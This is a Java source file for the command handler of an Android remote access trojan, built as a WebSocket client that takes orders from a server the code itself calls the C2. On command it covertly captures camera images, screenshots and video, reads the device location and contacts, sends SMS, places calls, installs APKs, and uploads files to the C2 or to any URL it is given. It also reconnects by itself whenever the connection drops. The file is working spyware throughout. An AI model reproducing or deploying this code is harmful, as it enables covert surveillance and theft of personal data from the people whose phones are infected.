package com.ot.grhq.client;

import android.content.Context;
import android.graphics.SurfaceTexture;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.LocationV2;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Phone;
import com.ot.grhq.client.functionality.SMS;
import com.ot.grhq.client.functionality.Screenshot;
import com.ot.grhq.client.functionality.Utils;

import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.util.List;
import java.util.Map;

public class WebSocketClient extends org.java_websocket.client.WebSocketClient {

    private Context context;

    public WebSocketClient(Context context, URI serverUri) {
        super(serverUri);
        this.context = context;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {

    }

    @Override
    public void onMessage(String message) {
        Log.e("eeee", message);
        try {
            JSONObject req = new JSONObject(message);

            JSONObject json = new JSONObject();
            json.put("type", "client");
            json.put("id", Utils.clientID(context));

            byte[] data = null;
            File file = null;
            String path = null;
            Command cmd = Command.valueOf(req.getString("cmd"));

            switch (cmd) {
                case CALL:
                    Phone.call(context, req.getString("number"));
                    break;
                case CAMERA_BACK:
                    path = Screenshot.captureImage(context, false);
                    file = new File(path);

                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/image");

                    json.put("res", "image");
                    json.put("filename", file.getName());
                    json.put("timestamp",System.currentTimeMillis());
                    send(json.toString());
                    break;
                case CAMERA_FRONT:
                    path = Screenshot.captureImage(context, true);
                    Thread.sleep(20000);
                    file = new File(path);

                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/image");

                    json.put("res", "image");
                    json.put("filename", file.getName());
                    json.put("timestamp", System.currentTimeMillis());
                    Log.e("eeee", json.toString());
                    send(json.toString());
                    break;
                case DELETE_CONTACT:
                    Phone.deleteContact(context, req.getString("name"), req.getString("number"));
                    break;
                case DOWNLOAD_FILE:
                    FileManager.downloadFile(context, req.getString("url"), req.getString("filename"));
                    break;
                case INSTALL_APK:
                    PackageManager.installApp(context, req.getString("path"));
                    break;
                case LAUNCH_APP:
                    PackageManager.launchApp(context, req.getString("package"));
                    break;
                case LIST_INSTALLED_APPS:
                    Map<String, String> apps = PackageManager.getInstalledApps(context);
                    sendResponse("app_list", mapToJson(apps).toString());
                    break;
                case LIST_FILES:
                    List<String> files = FileManager.listFiles(req.getString("path"));
                    sendResponse("files", files.toString());
                    break;
                case LOCATION:
                    Log.e("eeee", LocationV2.getLatitude(context).toString());
                    json.put("latitude", LocationV2.getLatitude(context));
                    json.put("longitude", LocationV2.getLongitude(context));
                    json.put("altitude", LocationV2.getAltitude(context));
                    long timestamp = System.currentTimeMillis();
                    json.put("timestamp", timestamp);
                    json.put("res", "location");
                    send(json.toString());
                    break;
                case READ_CONTACTS:
                    json.put("contacts", mapToJson(Phone.readContacts(context)).toString());
                    json.put("res", "contact");
                    send(json.toString());
                    break;
                case SCREENSHOT:
                    path = Screenshot.captureScreen();
                    file = new File(path);

                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/screenshot");

                    json.put("res", "screenshot");
                    json.put("filename", file.getName());
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case TEXT:
                    SMS.send(req.getString("number"), req.getString("message"));
                    break;
                case UPLOAD_FILE:
                    FileManager.uploadFile(req.getString("path"), req.getString("url"));
                    break;
                case VIDEO:
                    path = Screenshot.captureVideo(req.getBoolean("frontCamera"), req.getInt("duration"));;
                    file = new File(path);

                    FileManager.uploadFile(file.getAbsolutePath(), Utils.getC2Address() + "/video");

                    json.put("res", "video");
                    json.put("filename", file.getName());
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case WRITE_CONTACT:
                    Phone.addContact(context, req.getString("name"), req.getString("number"));
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            Log.e("eeee", e.getMessage());
            Log.e("eeee", e.toString());
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        MainService.isConnected = false;
        connect();
    }

    @Override
    public void onError(Exception ex) {

    }

    private void sendResponse(String responseType, String data) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "client");
        json.put("res", responseType);
        json.put("id", Utils.clientID(context));
        json.put("data", data);
        json.put("timestamp", System.currentTimeMillis());
        send(json.toString());
    }

    private JSONObject mapToJson(Map<String, String> map) {
        JSONObject jsonObject = new JSONObject();

        // Iterate through the map entries and add them to the JSONObject
        for (Map.Entry<String, String> entry : map.entrySet()) {
            try {
                jsonObject.put(entry.getKey(), entry.getValue());
            } catch (JSONException e) {}
        }

        return jsonObject;
    }

    /**
     * Get file contents
     * @param path file path
     * @return file content in bytes
     * @throws IOException
     */
    private byte[] getFileContent(String path) throws IOException {
        byte[] data = null;

        File file = new File(path);
        if (file.exists()) {
            FileInputStream fileInputStream = new FileInputStream(file);
            data = new byte[(int) file.length()];
            fileInputStream.read(data);
            fileInputStream.close();
        }

        return data;
    }
}
